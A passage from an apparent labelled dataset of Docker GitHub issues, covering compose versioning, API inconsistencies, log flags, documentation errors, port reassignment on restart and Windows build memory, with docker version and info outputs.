CI?\r\n"},{"labels":["documentation",null,null,null],"text":"There are several scripts in the [hack folder](https://github.com/docker/docker/tree/master/hack). It definitely deserves a good README 😄 "},{"labels":["documentation",null,null],"text":"When using `docker deploy` with a 3.2 compose version, it fails with \"unsupported Compose file version: 3.2\". I could not find any docs (especially on https://docs.docker.com/compose/compose-file/compose-versioning/#compatibility-matrix) on the required docker version to use the 3.2 compose.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Create a compose file with version 3.2:\r\n```\r\n# compose-v32.yml\r\nversion: '3.2'\r\n  services:\r\n    myservice:\r\n    ...\r\n```\r\n2. Run `docker deploy -c compose-v32.yml mystack\r\n\r\n**Describe the results you received:**\r\nunsupported Compose file version: 3.2\r\n\r\n**Describe the results you expected:**\r\nCreated myservice\r\n\r\n**Output of `docker version`:**\r\n```\r\nClient:\r\nVersion:      17.03.1-ce\r\nAPI version:  1.27\r\nGo version:   go1.7.5\r\nGit commit:   c6d412e\r\nBuilt:        Fri Mar 24 00:00:50 2017\r\nOS/Arch:      linux/amd64\r\n\r\nServer:\r\nVersion:      17.03.1-ce\r\nAPI version:  1.27 (minimum version 1.12)\r\nGo version:   go1.7.5\r\nGit commit:   c6d412e\r\nBuilt:        Fri Mar 24 00:00:50 2017\r\nOS/Arch:      linux/amd64\r\nExperimental: true\r\n```\r\n**Output of `docker info`:**\r\n```\r\nContainers: 5\r\nRunning: 4\r\nPaused: 0\r\nStopped: 1\r\nImages: 6\r\nServer Version: 17.03.1-ce\r\nStorage Driver: overlay2\r\nBacking Filesystem: extfs\r\nSupports d_type: true\r\nNative Overlay Diff: true\r\nLogging Driver: syslog\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\nVolume: local\r\nNetwork: bridge host ipvlan macvlan null overlay\r\nSwarm: active\r\nNodeID: mlc7uzdsvcnxkzi32437xybuv\r\nIs Manager: true\r\nClusterID: 6xjp4en70m49rkgt1u2jzo1fe\r\nManagers: 1\r\nNodes: 2\r\nOrchestration:\r\n Task History Retention Limit: 5\r\nRaft:\r\n Snapshot Interval: 10000\r\n Number of Old Snapshots to Retain: 0\r\n Heartbeat Tick: 1\r\n Election Tick: 3\r\nDispatcher:\r\n Heartbeat Period: 5 seconds\r\nCA Configuration:\r\n Expiry Duration: 3 months\r\nNode Address: 10.99.0.9\r\nManager Addresses:\r\n 10.99.0.9:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 4ab9917febca54791c5f071a9d1f404867857fcc\r\nrunc version: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe\r\ninit version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574)\r\nSecurity Options:\r\nseccomp\r\n Profile: default\r\nKernel Version: 4.9.13-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 3.354 GiB\r\nName: swarm-manager000000\r\nID: YLGP:ANHJ:ODKD:DZXG:YOG3:XA2Y:VVLK:LZ2M:N2NS:7PCF:STL5:DKVL\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\nFile Descriptors: 276\r\nGoroutines: 372\r\nSystem Time: 2017-04-04T14:33:05.635698193Z\r\nEventsListeners: 0\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nSwarm Mode running on Azure Container Services."},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nLinks property always is null, even whether the container has links.\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker run --net=dore-network -d --name node1 busybox tail -f /dev/null`\r\n2. `docker run --net=dore-network --link node1 -d --name node2 busybox tail -f /dev/null`\r\n3. `docker inspect node2`\r\n4. `curl --unix-socket /var/run/docker.sock http:/v1.26/containers/json | grep Links`\r\n\r\n**Describe the results you received:**\r\n\r\ninspect command:\r\n\r\n```\r\n...\r\n\"Networks\": {\r\n  \"dore-network\": {\r\n    ....\r\n    \"Links\": [\r\n      \"node1\"\r\n    ],\r\n    ...\r\n    }\r\n  }\r\n....\r\n```\r\n\r\nwith cURL command:\r\n\r\n```\r\n[{\"Id\":\"a43c96d41cacad628b5a51860650aa123c25416e16c563790a8eb76001d1b86f\",\"Names\":[\"/node2\"],\"Image\":\"busybox\",\"ImageID\":\"sha256:00f017a8c2a6e1fe2ffd05c281f27d069d2a99323a8cd514dd35f228ba26d2ff\",\"Command\":\"tail -f /dev/null\",\"Created\":1491275358,\"Ports\":[],\"Labels\":{},\"State\":\"running\",\"Status\":\"Up About a minute\",\"HostConfig\":{\"NetworkMode\":\"dore-network\"},\"NetworkSettings\":{\"Networks\":{\"dore-network\":{\"IPAMConfig\":null,\"Links\":null,\"Aliases\":null,\"NetworkID\":\"0c312941cff131e01bc038a9e7d196a0faf77c03ed38c365715755dc3c61b2ae\",\"EndpointID\":\"62df24f75be4a2b47eba58802c76417dc4cc6bb0a8b07c5908e2269e6bc0aa8a\",\"Gateway\":\"172.18.0.1\",\"IPAddress\":\"172.18.0.3\",\"IPPrefixLen\":16,\"IPv6Gateway\":\"\",\"GlobalIPv6Address\":\"\",\"GlobalIPv6PrefixLen\":0,\"MacAddress\":\"02:42:ac:12:00:03\"}}},\"Mounts\":[]},{\"Id\":\"3640df7f388ee551cb00b8c9040cca240e89891b2f11235943567e533b1f013e\",\"Names\":[\"/node1\"],\"Image\":\"busybox\",\"ImageID\":\"sha256:00f017a8c2a6e1fe2ffd05c281f27d069d2a99323a8cd514dd35f228ba26d2ff\",\"Command\":\"tail -f /dev/null\",\"Created\":1491275350,\"Ports\":[],\"Labels\":{},\"State\":\"running\",\"Status\":\"Up About a minute\",\"HostConfig\":{\"NetworkMode\":\"dore-network\"},\"NetworkSettings\":{\"Networks\":{\"dore-network\":{\"IPAMConfig\":null,\"Links\":null,\"Aliases\":null,\"NetworkID\":\"0c312941cff131e01bc038a9e7d196a0faf77c03ed38c365715755dc3c61b2ae\",\"EndpointID\":\"164c2b50d545660089b0eacb98a90e7334ebdbeca7cc16ce4448d283e644b076\",\"Gateway\":\"172.18.0.1\",\"IPAddress\":\"172.18.0.2\",\"IPPrefixLen\":16,\"IPv6Gateway\":\"\",\"GlobalIPv6Address\":\"\",\"GlobalIPv6PrefixLen\":0,\"MacAddress\":\"02:42:ac:12:00:02\"}}},\"Mounts\":[]}]\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\nInspect and Curl must be consistent. Curl response should have the Links information.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.13.1\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   092cba3\r\n Built:        Wed Feb  8 06:50:14 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.13.1\r\n API version:  1.26 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   092cba3\r\n Built:        Wed Feb  8 06:50:14 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 2\r\n Running: 2\r\n Paused: 0\r\n Stopped: 0\r\nImages: 33\r\nServer Version: 1.13.1\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 171\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: aa8187dbd3b7ad67d8e5e3a15115d3eef43a7ed1\r\nrunc version: 9df8b306d01f59d3a8029be411de015b7304dd8f\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-71-generic\r\nOperating System: Ubuntu 16.04.2 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 7.75 GiB\r\nName: my name\r\nID: Y4B7:ICGF:AXJG:HHJT:6LUD:W3IA:FUAY:TZNX:LYXF:U3V3:VI2R:5UF6\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n"},{"labels":[null,"documentation",null,null],"text":"---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\n**Description**\r\nUsing the `--since` and `--tail` flags with the command line tool, or the `since` or `tail` parameters via the API, does not yield expected results.\r\n\r\n**Steps to reproduce the issue:**\r\nThe following is true for either the cli or the API, but I'll describe it for the cli to keep things simple:\r\n\r\n1. Run `docker service logs --tail 1 [SERVICE]` or `docker service logs [1491249483 || 1m10s etc.] [SERVICE]`\r\n\r\n**Describe the results you received:**\r\nMany lines returned, and in the case of failing services which are retrying every n seconds, this is _thousands_ of lines.\r\n\r\n**Describe the results you expected:**\r\nWith `--tail 1`, only 1 line returned. With `--since [TIMESTAMP]` only lines returned since that timestamp.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nIt seems that the extra lines are the result of grabbing logs from all service tasks, though I could be wrong.\r\n\r\nQuerying the individual containers created by the `docker service` command, the `--tail` and `--since` options work as expected.\r\n\r\n**Output of `docker version`:**\r\n\r\nOutput is from my Mac, but the same thing happens for the same version on Linux:\r\n```\r\nClient:\r\n Version:      17.03.1-ce\r\n API version:  1.27\r\n Go version:   go1.7.5\r\n Git commit:   c6d412e\r\n Built:        Tue Mar 28 00:40:02 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      17.03.1-ce\r\n API version:  1.27 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   c6d412e\r\n Built:        Fri Mar 24 00:00:50 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\nAgain this is from my Mac, but the tests were also performed on Linux with a proper swarm, with the same results:\r\n```\r\nContainers: 6                                                                                                                                                             [25/4682]\r\n Running: 1\r\n Paused: 0\r\n Stopped: 5\r\nImages: 350\r\nServer Version: 17.03.1-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\nSwarm: active\r\n NodeID: mp9up3hu4ik275i4nl23hx1zv\r\n Is Manager: true\r\n ClusterID: flbky82mvb51ngvbmb3a0pvqn\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: 192.168.65.2\r\n Manager Addresses:\r\n  192.168.65.2:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 4ab9917febca54791c5f071a9d1f404867857fcc\r\nrunc version: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe\r\ninit version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574)\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.13-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952 GiB\r\nName: moby\r\nID: IJXO:PQVJ:Z5IQ:AV2T:PNJX:B5IK:L3FW:EOFM:TLUX:WM56:GTBA:GH4W\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 39\r\n Goroutines: 143\r\n System Time: 2017-04-03T19:46:12.33482745Z\r\n EventsListeners: 2\r\nNo Proxy: *.local, 169.254/16\r\nUsername: afrazkhan\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/blob/17.03.x/docs/reference/commandline/service_create.md\r\n![image](https://cloud.githubusercontent.com/assets/1900106/24601239/6c42dcac-1858-11e7-8cfe-79ca04a46b90.png)\r\nOK with no issues\r\n\r\nhttps://docs.docker.com/engine/reference/commandline/service_create/#specify-service-constraints---constraint\r\n![image](https://cloud.githubusercontent.com/assets/1900106/24601250/79eaf074-1858-11e7-929f-b6a20e74b064.png)\r\nTable is messed up\r\nAnd `<tdnode.role</td>` is above the table\r\n\r\nThis is the table in HTML:\r\n```html\r\n<table>\r\n  <tr>\r\n    <th>node attribute</th>\r\n    <th>matches</th>\r\n    <th>example</th>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>node.id</tt></td>\r\n    <td>Node ID</td>\r\n    <td><tt>node.id == 2ivku8v2gvtg4</tt></td>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>node.hostname</tt></td>\r\n    <td>Node hostname</td>\r\n    <td><tt>node.hostname != node-2</tt></td>\r\n  </tr>\r\n  <tr>\r\n    &lt;td<tt>node.role</tt>&lt;/td&gt;\r\n    <td><tt>node role: manager</tt></td>\r\n    <td><tt>node.role == manager</tt></td>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>node.labels</tt></td>\r\n    <td>user defined node labels</td>\r\n    <td><tt>node.labels.security == high</tt></td>\r\n  </tr>\r\n  <tr>\r\n    <td><tt>engine.labels</tt></td>\r\n    <td>Docker Engine's labels</td>\r\n    <td><tt>engine.labels.operatingsystem == ubuntu 14.04</tt></td>\r\n  </tr>\r\n</table>\r\n```"},{"labels":["documentation",null,null],"text":"Wrong containerd version in release notes for release v17.03.1-ce:\r\n```\r\nUpdate containerd to 595e75c212d19a81d2b808a518fe1afc1391dad5 #31662\r\n```\r\n(https://github.com/docker/docker/pull/31662/commits/74c52a7bab45f63defdbe4c33ec5c77416f2ecf7)\r\n\r\nBut here version changed to 4ab9917febca54791c5f071a9d1f404867857fcc:\r\nhttps://github.com/docker/docker/commit/00132cc4426d7914822b98f952d32a45b015485e"},{"labels":["documentation",null,null],"text":"platform: docker toobox for windows 17.0.03\r\n\r\nWhen running a container with a mount from a host drive, the docker host folder contents overwrites the container's folder contents entirely. There is no overlay of data as detailed in the docs.\r\n\r\nmy ubuntu container command: \r\n\r\n> docker run -d -P --name MYCONTAINER -v /c/Users/drupal8_www:/var/www/html MY:IMAGE\r\n\r\nby stopping and starting this i can clearly see and repeat the effect describe above.\r\n\r\nthanks"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nPushing a docker image pushes significantly more data than pulling\r\n\r\n**Steps to reproduce the issue:**\r\n1. build an easily compressible image (e.g. https://github.com/frankh/docker-compress-test)\r\n2. docker push it\r\n  * Note how much it uploads. In my case, it's ~40MB\r\n3. delete the image and docker pull\r\n  * Note how much it downloads. In my case, ~40KB\r\n\r\n**Describe the results you received:**\r\n\r\nPushing pushes significantly more data than pulling\r\n\r\n**Describe the results you expected:**\r\n\r\nPushing and pulling move roughly the same amount of data\r\n\r\n**Output of `docker version`:**\r\n\r\nDocker version 17.03.0-ce, build 60ccb22\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 34\r\n Running: 2\r\n Paused: 0\r\n Stopped: 32\r\nImages: 1355\r\nServer Version: 17.03.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 977c511eda0925a723debdc94d09459af49d082a\r\nrunc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.12-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952 GiB\r\nName: moby\r\nID: CXWS:GVKV:ICYK:NJ7L:26LZ:DOYO:OBL4:NDAW:4TLZ:J2TJ:XML7:VDR2\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 33\r\n Goroutines: 40\r\n System Time: 2017-03-22T10:22:34.60882776Z\r\n EventsListeners: 1\r\nNo Proxy: *.local, 169.254/16\r\nUsername: frankh\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nDocker for mac (also reproducible on other platforms)"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nThe `DiskUsage` call (which backs `docker system df`) can take an extremely long time to finish, since it walks through every container and volume's filesystem. In cases where you have lots of containers or volumes with lots of files, we've seen `DiskUsage` take minutes or even hours to complete, chewing up CPU and disk I/O the whole time. This isn't necessarily incorrect behavior, per se, but it is at least very surprising, especially since `ContainerStats` isn't expensive at all.\r\n\r\nI'm not sure how feasible it would be to improve the performance of `DiskUsage`, but if that's not possible, there should be more messaging around the costs of this API call.\r\n\r\nAlso, is there any way to get the size of an individual volume, or can you only get the size of every volume at once with `DiskUsage`?"},{"labels":["documentation",null,null,null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nWhen a container uses `--restart=always -p` the port changes with every automatic restart. This was not the case with `v1.13` - is this intentional?\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker run --restart=always -p 8000 debian:jessie sleep 2`\r\n2. Run `docker ps` a couple times to check the assigned port\r\n\r\n**Describe the results you received:**\r\nThe port changes with every restart\r\n\r\n**Describe the results you expected:**\r\nThe port should probably stay the same\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.03.0-ce\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.03.0-ce\r\n API version:  1.26 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 43\r\n Running: 38\r\n Paused: 0\r\n Stopped: 5\r\nImages: 27\r\nServer Version: 17.03.0-ce\r\nStorage Driver: devicemapper\r\n Pool Name: data-docker_thin\r\n Pool Blocksize: 65.54 kB\r\n Base Device Size: 10.74 GB\r\n Backing Filesystem: xfs\r\n Data file:\r\n Metadata file:\r\n Data Space Used: 14.39 GB\r\n Data Space Total: 96.64 GB\r\n Data Space Available: 82.25 GB\r\n Metadata Space Used: 21.34 MB\r\n Metadata Space Total: 536.9 MB\r\n Metadata Space Available: 515.5 MB\r\n Thin Pool Minimum Free Space: 9.664 GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: true\r\n Deferred Deletion Enabled: true\r\n Deferred Deleted Device Count: 0\r\n Library Version: 1.02.135-RHEL7 (2016-11-16)\r\nLogging Driver: journald\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 977c511eda0925a723debdc94d09459af49d082a\r\nrunc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-514.6.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 7.305 GiB\r\nName: us-1\r\nID: 6UKZ:VSEG:Z6FX:3A7K:YS6F:HUMA:HWFR:7D3L:IZIG:OVT4:33FA:GNDN\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: IPv4 forwarding is disabled\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: true\r\n```\r\n\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nThe [docs here](https://github.com/docker/docker/blob/master/docs/reference/commandline/inspect.md#get-an-instances-image-name) on how to \"Get an instance's image name\" are wrong.\r\n\r\n**Steps to reproduce the issue:**\r\n1. run `docker inspect --format='{{.Container.Spec.Image}}' <container ID>`\r\n\r\n**Describe the results you received:**\r\n\r\n```\r\nTemplate parsing error: template: :1:12: executing \"\" at <.Container.Spec.Imag...>: map has no entry for key \"Container\"\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\nI expect to the command to return an image name.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\ndocker version\r\n\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 21:44:32 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 21:44:32 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\ndocker info\r\n\r\nContainers: 4\r\n Running: 4\r\n Paused: 0\r\n Stopped: 0\r\nImages: 4\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 75\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: host overlay bridge null\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: apparmor\r\nKernel Version: 3.16.0-77-generic\r\nOperating System: Ubuntu 14.04 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 24\r\nTotal Memory: 31.12 GiB\r\nName: sto3-accesspoint-a62.sto3.spotify.net\r\nID: AYPE:FMXB:2PCP:DHI4:LUOS:HA5P:SWRJ:DMDE:JLR4:C3KE:VVRU:JLMS\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nInsecure Registries:\r\n 127.0.0.0/8```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nUsing docker-machine VM on vmware on Mac Sierra.\r\n"},{"labels":[null,"documentation",null,null,null],"text":"The markdown API docs are missing any description for the `NetworkingConfig` object that is included in the config to create a container. This object is included in the example JSON that gets POSTed to `/containers/create` in the 1.22, 1.23, and 1.24 docs, but is not mentioned in the following \"JSON Parameters\" section. In particular, its child object `EndpointsConfig` is not fully defined.\r\n\r\nThis issue only affects the older markdown API docs. The objects mentioned above are defined in more detail in `api/swagger.yaml`. For the most part, the various places in the swagger description of the API that accept or produce information about networks refer to `#/definitions/EndpointSettings`.\r\n\r\n"},{"labels":["documentation"],"text":"\r\n**Description**\r\n\r\nThe placement constraints grammar is not documented.\r\n\r\n**Steps to reproduce the issue:**\r\n1. `docker help create`\r\n2.  search for \"placement constraints\" on docker.com\r\n3. \r\n\r\n**Describe the results you received:**\r\n\r\nNo documentation.\r\n\r\n**Describe the results you expected:**\r\n\r\nDocumentation of the grammar, such as how not equal is written, whether and and or can be used, and what the grammar is etc.\r\n"},{"labels":["documentation",null],"text":"PR https://github.com/docker/docker/pull/31710 adds the `--verbose` option for `network inspect` to display service level details across the cluster for swarm mode overlay networks.  `swagger.yml` has to be updated to include the types of the objects in `docker network inspect --verbose` output."},{"labels":["documentation",null,null,null],"text":"I'm opening this issue as a bug because from what I've read docker is supposed to not enforce memory or disk space limitations during container's build or run actions. \r\n\r\nI have a docker file that does a lot when building and I can't really share to help with reproducing. This docker file behaves differently on different hosts. In one of them runs out of memory which contradicts the above. To help me troubleshoot the issue I've added a cmd that reports the free memory before it runs out of memory\r\n```powershell\r\n(Get-Counter -Counter \"\\Memory\\Available MBytes\").CounterSamples[0].CookedValue\r\n```\r\n\r\n1. On my Windows 10 host (my workstation laptop) the container fails to build. The workstation has 16GB of memory. The reported free memory before the out of memory crash is 200MB.\r\n1. On a Windows 2016 on a Hyper-V instanced hosted on my workstation the container builds successfully. The Hyper-V instance is assgined 4GB of memory. The reported free memory before the out of memory crash is 538MB.\r\n1. On a Windows 2016 host on azure the container builds successfully. The Azure VM is running with 7GB. The reported free memory before the out of memory crash is 3000MB.\r\n\r\nEach of the hosts reports the following version\r\n**1. Windows 10 Host**\r\n```text\r\nClient:\r\n Version:      17.03.0-ce\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:40:59 2017\r\n OS/Arch:      windows/amd64\r\n\r\nServer:\r\n Version:      17.03.0-ce\r\n API version:  1.26 (minimum version 1.24)\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:40:59 2017\r\n OS/Arch:      windows/amd64\r\n Experimental: true\r\n```\r\n\r\n**2. Windows 2016 Host on Hyper-V**\r\n```text\r\nClient:\r\n Version:      17.03.0-ee-1\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   9094a76\r\n Built:        Wed Mar  1 00:49:51 2017\r\n OS/Arch:      windows/amd64\r\n\r\nServer:\r\n Version:      